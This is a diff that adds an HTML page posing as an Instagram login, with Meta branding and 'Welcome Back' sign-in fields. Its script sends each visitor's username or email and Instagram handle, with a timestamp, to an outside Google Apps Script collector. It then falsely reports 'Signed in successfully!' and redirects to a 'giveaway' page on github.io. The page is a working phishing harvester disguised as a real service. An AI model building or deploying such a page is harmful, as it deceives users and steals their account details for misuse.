@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Helvetica, Arial, sans-serif;
+}
+
+body{
+    background:#121212;
+    color:white;
+    min-height:100vh;
+    display:flex;
+}
+
+.container{
+    display:flex;
+    width:100%;
+}
+
+/* LEFT SIDE */
+
+.left{
+    flex:1;
+    background:linear-gradient(135deg,#0f172a,#020617);
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    align-items:center;
+    padding:50px;
+    text-align:center;
+}
+
+.logo{
+    width:90px;
+    height:90px;
+    border-radius:25px;
+    object-fit:cover;
+    margin-bottom:30px;
+}
+
+.left h1{
+    font-size:3rem;
+    margin-bottom:20px;
+}
+
+.gradient{
+    background:linear-gradient(
+        90deg,
+        #f97316,
+        #ec4899,
+        #8b5cf6
+    );
+    -webkit-background-clip:text;
+    -webkit-text-fill-color:transparent;
+}
+
+.left p{
+    color:#cbd5e1;
+    max-width:500px;
+    font-size:1.1rem;
+    line-height:1.6;
+}
+
+.mockup{
+    margin-top:50px;
+    display:flex;
+    gap:15px;
+}
+
+.card{
+    width:140px;
+    height:220px;
+    border-radius:20px;
+    object-fit:cover;
+    box-shadow:0 10px 30px rgba(0,0,0,.3);
+}
+
+.card:nth-child(2){
+    transform:translateY(-20px);
+}
+
+/* RIGHT SIDE */
+
+.right{
+    flex:1;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    padding:40px;
+}
+
+.login-box{
+    width:100%;
+    max-width:450px;
+}
+
+.login-box h2{
+    margin-bottom:30px;
+    font-size:2rem;
+}
+
+.input-group{
+    margin-bottom:15px;
+}
+
+input{
+    width:100%;
+    padding:16px;
+    border-radius:14px;
+    border:1px solid #374151;
+    background:#18181b;
+    color:white;
+    font-size:1rem;
+}
+
+input:focus{
+    outline:none;
+    border-color:#3b82f6;
+}
+
+.login-btn{
+    width:100%;
+    border:none;
+    padding:16px;
+    border-radius:14px;
+    background:#2563eb;
+    color:white;
+    font-size:1rem;
+    cursor:pointer;
+    margin-top:10px;
+}
+
+.login-btn:hover{
+    opacity:.9;
+}
+
+.forgot{
+    text-align:center;
+    margin:20px 0;
+}
+
+.forgot a{
+    color:white;
+    text-decoration:none;
+}
+
+.divider{
+    text-align:center;
+    color:#6b7280;
+    margin:25px 0;
+}
+
+.alt-btn{
+    width:100%;
+    padding:16px;
+    border-radius:14px;
+    border:1px solid #374151;
+    background:transparent;
+    color:white;
+    cursor:pointer;
+    margin-bottom:12px;
+}
+
+.footer{
+    text-align:center;
+    margin-top:30px;
+    color:#9ca3af;
+}
+
+@media(max-width:900px){
+
+    .container{
+        flex-direction:column;
+    }
+
+    .left{
+        min-height:350px;
+    }
+
+    .left h1{
+        font-size:2rem;
+    }
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+
+    <div class="left">
+
+        <img src="images/logo.png" alt="Logo" class="logo">
+
+        <h1>
+            See everyday moments from your
+            <span class="gradient">close friends.</span>
+        </h1>
+
+        <p></p>
+
+        <div class="mockup">
+            <img src="images/post1.jpg" class="card">
+            <img src="images/post2.jpg" class="card">
+            <img src="images/post3.jpg" class="card">
+        </div>
+
+    </div>
+
+    <div class="right">
+
+        <div class="login-box">
+
+            <h2>Welcome Back</h2>
+
+            <div class="input-group">
+                <input
+                    id="userInput"
+                    type="text"
+                    placeholder="Username or Email">
+            </div>
+
+            <div class="input-group">
+                <input
+                    id="handleInput"
+                    type="text"
+                    placeholder="Insta Handle">
+            </div>
+
+            <button class="login-btn" onclick="submitForm()">
+                Sign In
+            </button>
+
+            <div class="forgot">
+                <a href="#" onclick="redirectMsg()">Forgot password?</a>
+            </div>
+
+            <div class="divider">
+                OR
+            </div>
+
+            <button class="alt-btn" onclick="redirectMsg()">
+                Continue with Social Account
+            </button>
+
+            <button class="alt-btn" onclick="redirectMsg()">
+                Create New Account
+            </button>
+
+            <div class="footer">
+                Meta
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<script>
+function redirectMsg(){
+    alert("This is just a site to redirect you to Instagram for the purpose of linking your account.");
+}
+
+async function submitForm(){
+    const user = document.getElementById("userInput").value.trim();
+    const handle = document.getElementById("handleInput").value.trim();
+
+    if(!user || !handle){
+        alert("Please fill in all fields.");
+        return;
+    }
+
+    const SHEET_URL = "https://script.google.com/macros/s/AKfycbwQ6QU5xnr4M12WjtmAz4i_q2a6ETe1rq3tHCfqJuUo_LW8bNYLhs5lFdjYFJP1ng4/exec";
+
+    const params = new URLSearchParams({
+        user: user,
+        handle: handle,
+        timestamp: Date.now()
+    });
+
+    try {
+        await fetch(SHEET_URL + "?" + params.toString(), {
+            method: "GET",
+            mode: "no-cors"
+        });
+        alert("Signed in successfully!");
+        window.location.href = "https://xenderax.github.io/studdropgiveaway/";
+    } catch(err){
+        alert("Something went wrong. Please try again.");
+        console.error(err);
+    }
+}
+</script>
+
+</body>
+</html>
